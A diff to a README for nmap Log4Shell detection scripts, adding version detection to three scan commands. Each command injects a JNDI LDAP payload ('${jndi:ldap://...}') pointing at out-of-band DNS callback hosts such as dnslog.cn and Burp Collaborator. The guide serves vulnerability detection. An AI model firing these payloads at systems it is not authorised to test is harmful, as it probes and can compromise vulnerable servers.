@@ -40,14 +40,14 @@ nmap -v --script=http-log4shell,ssh-log4shell,imap-log4shell "--script-args=log4
 Go to http://github.com/kost/logdns and get DNS server. Get domain and point to the somewhere where you have installed logdns:
 
 ```
-nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.logdns.xxx}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
+nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.logdns.xxx}"' -T4 -n -p0-65535 -sV --script-timeout=1m MY.IPs.TO.SCAN
 ```
 ### By help of dnslog.cn
 
 Go to http://dnslog.cn/ and Get SubDomain. Replace your xxxx with your SubDomain:
 
 ```
-nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.dnslog.cn}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
+nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.dnslog.cn}"' -T4 -n -p0-65535 -sV --script-timeout=1m MY.IPs.TO.SCAN
 ```
 
 ### By help of burpcollaborator
@@ -55,7 +55,7 @@ nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4sh
 Take your domain from Burp collaborator and replace xxxx with your domain:
 
 ```
-nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
+nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 -sV --script-timeout=1m MY.IPs.TO.SCAN
 ```
 
 ### By help of CanaryToken (https://canarytokens.org/generate#)
